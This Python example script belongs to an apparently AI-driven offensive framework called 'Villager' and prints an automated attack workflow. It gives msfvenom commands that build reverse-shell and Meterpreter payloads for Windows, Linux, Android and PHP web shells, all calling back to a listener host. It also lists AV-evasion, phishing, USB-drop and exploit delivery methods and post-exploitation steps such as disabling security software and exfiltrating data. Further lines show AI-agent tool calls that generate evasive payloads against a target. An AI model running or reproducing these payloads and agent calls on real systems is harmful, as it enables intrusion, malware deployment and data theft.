#!/usr/bin/env python3
"""
Villager AI Framework - Payload Generation Example

This example demonstrates how to use Villager for automated
payload generation using MSFVenom and other tools.
"""

import sys
import os

# Add Villager to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def payload_generation_workflow():
    """Demonstrate automated payload generation workflow."""
    
    print("💥 Villager AI - Payload Generation Workflow")
    print("=" * 50)
    
    # Step 1: Payload planning
    print("\n📋 Step 1: AI-Driven Payload Planning")
    print("-" * 45)
    
    payload_scenarios = [
        {
            "scenario": "Windows Corporate Environment",
            "target_os": "Windows 10/11",
            "architecture": "x64",
            "evasion": "High (AV bypass required)",
            "delivery": "Email attachment, USB, Network share"
        },
        {
            "scenario": "Linux Web Server",
            "target_os": "Ubuntu 20.04 LTS",
            "architecture": "x64",
            "evasion": "Medium (WAF bypass)",
            "delivery": "Web upload, SSH, Cron job"
        },
        {
            "scenario": "Mobile Application",
            "target_os": "Android 11+",
            "architecture": "ARM64",
            "evasion": "High (Play Store detection)",
            "delivery": "APK sideload, Malicious app"
        }
    ]
    
    for scenario in payload_scenarios:
        print(f"\n🎯 {scenario['scenario']}:")
        print(f"   OS: {scenario['target_os']}")
        print(f"   Architecture: {scenario['architecture']}")
        print(f"   Evasion Level: {scenario['evasion']}")
        print(f"   Delivery Method: {scenario['delivery']}")
    
    # Step 2: MSFVenom payload generation
    print("\n🔧 Step 2: MSFVenom Payload Generation")
    print("-" * 45)
    
    msfvenom_payloads = [
        {
            "name": "Windows Meterpreter Reverse TCP",
            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe",
            "features": ["Encrypted communication", "Multi-stage", "Post-exploitation modules"]
        },
        {
            "name": "Linux Reverse Shell",
            "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload",
            "features": ["Direct shell access", "Small size", "No dependencies"]
        },
        {
            "name": "Android Meterpreter APK",
            "command": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.apk",
            "features": ["Mobile persistence", "SMS/Call monitoring", "Location tracking"]
        },
        {
            "name": "Web Shell (PHP)",
            "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php",
            "features": ["Web-based access", "File upload/download", "Command execution"]
        }
    ]
    
    for payload in msfvenom_payloads:
        print(f"\n💣 {payload['name']}:")
        print(f"   Command: {payload['command']}")
        print(f"   Features: {', '.join(payload['features'])}")
    
    # Step 3: Evasion techniques
    print("\n🥷 Step 3: Evasion Techniques")
    print("-" * 35)
    
    evasion_techniques = [
        {
            "technique": "Encoding",
            "tools": ["msfvenom encoders", "custom encoders"],
            "description": "Encode payload to avoid signature detection"
        },
        {
            "technique": "Packing",
            "tools": ["UPX", "MPRESS", "custom packers"],
            "description": "Compress and obfuscate executable structure"
        },
        {
            "technique": "Polymorphism",
            "tools": ["custom generators", "metasploit modules"],
            "description": "Generate unique payload variants"
        },
        {
            "technique": "Anti-VM",
            "tools": ["custom checks", "environment detection"],
            "description": "Detect and avoid virtualized environments"
        }
    ]
    
    for technique in evasion_techniques:
        print(f"\n🛡️ {technique['technique']}:")
        print(f"   Tools: {', '.join(technique['tools'])}")
        print(f"   Purpose: {technique['description']}")
    
    # Step 4: Delivery mechanisms
    print("\n📦 Step 4: Delivery Mechanisms")
    print("-" * 35)
    
    delivery_methods = [
        {
            "method": "Email Attachment",
            "techniques": ["Macro-enabled documents", "ZIP bombs", "Social engineering"],
            "tools": ["phishery", "gophish", "custom templates"]
        },
        {
            "method": "Web Exploitation",
            "techniques": ["File upload vulnerabilities", "SQL injection", "XSS"],
            "tools": ["burpsuite", "custom exploits", "web shells"]
        },
        {
            "method": "Physical Access",
            "techniques": ["USB drops", "BadUSB", "Rubber ducky"],
            "tools": ["malduino", "bash bunny", "custom hardware"]
        },
        {
            "method": "Network Exploitation",
            "techniques": ["SMB exploits", "RDP attacks", "SSH brute force"],
            "tools": ["eternalblue", "bluekeep", "hydra"]
        }
    ]
    
    for method in delivery_methods:
        print(f"\n📡 {method['method']}:")
        print(f"   Techniques: {', '.join(method['techniques'])}")
        print(f"   Tools: {', '.join(method['tools'])}")
    
    # Step 5: Post-exploitation setup
    print("\n🎯 Step 5: Post-Exploitation Setup")
    print("-" * 40)
    
    post_exploit_tasks = [
        {
            "phase": "Initial Access",
            "tasks": ["Establish persistence", "Disable security software", "Gather system information"]
        },
        {
            "phase": "Privilege Escalation",
            "tasks": ["Exploit local vulnerabilities", "Abuse misconfigurations", "Token manipulation"]
        },
        {
            "phase": "Lateral Movement",
            "tasks": ["Credential harvesting", "Pass-the-hash", "Network reconnaissance"]
        },
        {
            "phase": "Data Exfiltration",
            "tasks": ["Identify sensitive data", "Compress and encrypt", "Establish exfiltration channels"]
        }
    ]
    
    for phase in post_exploit_tasks:
        print(f"\n🔄 {phase['phase']}:")
        for task in phase['tasks']:
            print(f"   • {task}")
    
    print("\n✅ Payload Generation Workflow Complete!")
    print("\n⚠️  IMPORTANT SECURITY NOTICE:")
    print("   • Only use these techniques on systems you own or have explicit permission to test")
    print("   • Follow responsible disclosure for any vulnerabilities found")
    print("   • Ensure compliance with applicable laws and regulations")

def mcp_payload_example():
    """Show how to use MCP tools for payload generation."""
    
    print("\n🔗 MCP Payload Generation Example")
    print("=" * 40)
    
    # Example MCP calls for payload generation
    mcp_calls = [
        {
            "tool": "mcp_villager-proper_create_task",
            "parameters": {
                "abstract": "Generate Windows Payload",
                "description": "Create a Windows meterpreter reverse TCP payload with AV evasion for target 192.168.1.50",
                "verification": "Payload generated successfully and tested for AV evasion"
            }
        },
        {
            "tool": "mcp_villager-proper_execute_tool",
            "parameters": {
                "tool_name": "os_execute_cmd",
                "parameters": {
                    "system_command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe"
                }
            }
        },
        {
            "tool": "mcp_villager-proper_schedule_agent",
            "parameters": {
                "agent_name": "Payload Analyst",
                "task_input": "Analyze the generated payload for detection rates and suggest improvements"
            }
        }
    ]
    
    for i, call in enumerate(mcp_calls, 1):
        print(f"\n{i}. {call['tool']}:")
        print(f"   Parameters: {call['parameters']}")

if __name__ == "__main__":
    payload_generation_workflow()
    mcp_payload_example()
